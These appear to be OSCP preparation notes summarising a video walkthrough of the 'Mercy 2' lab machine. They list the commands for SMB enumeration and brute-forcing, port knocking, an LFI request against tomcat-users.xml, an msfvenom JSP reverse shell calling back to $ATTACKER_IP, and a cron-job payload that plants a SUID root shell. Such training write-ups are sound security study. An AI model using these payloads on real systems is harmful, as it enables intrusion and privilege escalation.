This comprehensive guide is based on the walkthrough of the **DigitalWorld.local - Mercy 2** machine, covering essential commands and concepts for your OSCP preparation.

***

## 💻 OSCP Walkthrough Notes: Mercy 2

The machine "Mercy 2" focuses on a chained attack involving extensive enumeration of various services, a password reuse exploit, and an LFI vulnerability to get initial access, followed by a local cron job exploit for privilege escalation.

### **1. Initial Enumeration & Discovery**

| Step | Technique / Concept | Summary | Timestamp |
| :--- | :--- | :--- | :--- |
| **Nmap Scan** | Service Enumeration | Identified various services: DNS (53), POP3/IMAP (110, 993, 995), NetBIOS/SMB (139, 445), and Apache Tomcat (8080). | [[29:33](http://www.youtube.com/watch?v=270ZD17aA1Y&t=1773)] |
| **Web Enumeration** | Base64 Decoding | Port 8080 presented an encoded message hinting at the user "plead for mercy" and the password "password." | [[36:13](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2173)] |
| **SMB Enumeration** | Null Session / Users | Used `enum4linux` to exploit a **null session** vulnerability on SMB, leaking several system users: **qiu**, **plead for mercy**, and **fluffy**. | [[40:37](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2437)] |
| **SMB Shares** | Shares Discovery | Used an Nmap script to find the share **qiu** corresponding to `/home/qiu`. | [[49:12](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2952)] |

***

### **2. Initial Access**

| Step | Technique / Concept | Summary | Timestamp |
| :--- | :--- | :--- | :--- |
| **SMB Brute-Force** | Password Reuse | Used `msfconsole`'s `smb_login` module with the leaked users and `rockyou.txt` to discover the credential **qiu:password**. | [[54:12](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3252)] |
| **Lateral Looting** | File Exfiltration | Logged into the `qiu` share via `smbclient` and downloaded configuration files, including `config.print`. | [[57:09](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3429)] |
| **Port Knocking** | Configuration Leak | The `config.print` file revealed the **port knocking** sequences required to open hidden firewall ports **80 (HTTP)** and **22 (SSH)**. | [[01:01:29](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3689)] |
| **LFI to Credentials** | Tomcat Config | Knocked port 80 open and found the RIPS 0.53 application vulnerable to **Local File Inclusion (LFI)**. Used LFI to read the Tomcat user configuration. | [[01:10:42](http://www.youtube.com/watch?v=270ZD17aA1Y&t=4242)] |
| **Web Shell Upload** | Manager Exploit | Used the leaked Tomcat credentials (e.g., `this is a super duper long user:heartbreak is inevitable`) to log into the Tomcat Manager on port 8080. A **JSP reverse shell WAR file** (generated via `msfvenom`) was uploaded and executed, providing a shell as the `tomcat` user. | [[01:23:35](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5015)] |

***

### **3. Privilege Escalation**

| Step | Technique / Concept | Summary | Timestamp |
| :--- | :--- | :--- | :--- |
| **Horizontal Escalation** | Password Reuse | Used the password `fluffy` from the Tomcat credentials to switch from the `tomcat` user to the **fluffy** user. | [[01:29:49](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5389)] |
| **Vertical Escalation** | Cron Job/SUID Exploit | Discovered the file `/home/fluffy/.private/timeclock` was writable by the `fluffy` user and was executed by a **root cron job**. | [[01:37:32](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5852)] |
| **SUID Payload** | Binary Execution | Wrote a payload into `timeclock` to copy `/bin/bash` to `/var/temp/dash` and set the **SUID bit** on it. Once the cron job ran, the user executed the new SUID binary to gain a **root shell**. | [[01:38:18](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5898)] |

***

## ⚙️ Essential Commands

### **Enumeration & Discovery**

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- -sC -sV $TARGET_IP --open` | Full port scan with default and version scripts. | [[29:33](http://www.youtube.com/watch?v=270ZD17aA1Y&t=1773)] |
| `echo "BASE64_STRING" \| base64 -d` | Decodes the Base64 string found on the 8080 web page. | [[37:08](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2228)] |
| `enum4linux $TARGET_IP` | Attempts to enumerate user and share information from SMB (via null session). | [[40:37](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2437)] |
| `nmap -p139,445 --script smb-enum-shares $TARGET_IP` | Enumerates accessible SMB shares. | [[49:12](http://www.youtube.com/watch?v=270ZD17aA1Y&t=2952)] |
| `smbclient //$TARGET_IP/qiu -N` | Attempts to connect to the `qiu` share with a null session (failed). | [[51:33](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3093)] |
| `smbclient //$TARGET_IP/qiu -U qiu%password` | Connects to the `qiu` share using the discovered credentials. | [[57:09](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3429)] |
| `get .bash_history` | Used within `smbclient` to download files from the share. | [[58:34](http://www.youtube.com/watch?v=270ZD17aA1Y&t=3514)] |

### **Knocking Ports (HTTP)**

The following command sequence is used to knock open Port 80, based on the leak from the `config.print` file:
| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `nmap -Pn --host-timeout 201 --max-retries 0 -p139,273,91,4 $TARGET_IP` | Sends SYN packets in sequence to knock open Port 80. | [[01:09:20](http://www.youtube.com/watch?v=270ZD17aA1Y&t=4160)] |
| `curl http://$TARGET_IP:80/` | Confirms Port 80 is open and retrieves the new content. | [[01:10:05](http://www.youtube.com/watch?v=270ZD17aA1Y&t=4205)] |

### **Initial Access & Shell**

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `http://$TARGET_IP/no_mercy/windows/code.php?file=/etc/tomcat7/tomcat-users.xml` | **LFI Exploit:** Used to read the Tomcat user configuration file. | [[01:22:29](http://www.youtube.com/watch?v=270ZD17aA1Y&t=4949)] |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=1 -f war -o offsec.war` | Generates a JSP reverse shell payload in WAR file format for Tomcat upload. | [[01:24:18](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5058)] |
| `nc -lvp 1` | Sets up the listener to catch the reverse shell. | [[01:26:40](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5200)] |

### **Privilege Escalation**

| Command | Purpose | Timestamp |
| :--- | :--- | :--- |
| `su fluffy` | Switches user using password reuse (`fluffy:fluffy`). | [[01:29:49](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5389)] |
| `echo 'cp /bin/bash /var/temp/dash; chmod u+s /var/temp/dash' >> /home/fluffy/.private/timeclock` | **SUID Exploit:** Appends the payload to the cron job file to create a SUID root shell. | [[01:38:18](http://www.youtube.com/watch?v=270ZD17aA1Y&t=5898)] |
| `/var/temp/dash -p` | Executes the SUID binary to gain a root shell (UID=0). | [[01:40:45](http://www.youtube.com/watch?v=270ZD17aA1Y&t=6045)] |
| `cat /root/author_secret.txt` | Retrieves the root flag/final proof. | [[01:40:57](http://www.youtube.com/watch?v=270ZD17aA1Y&t=6057)] |
http://googleusercontent.com/youtube_content/0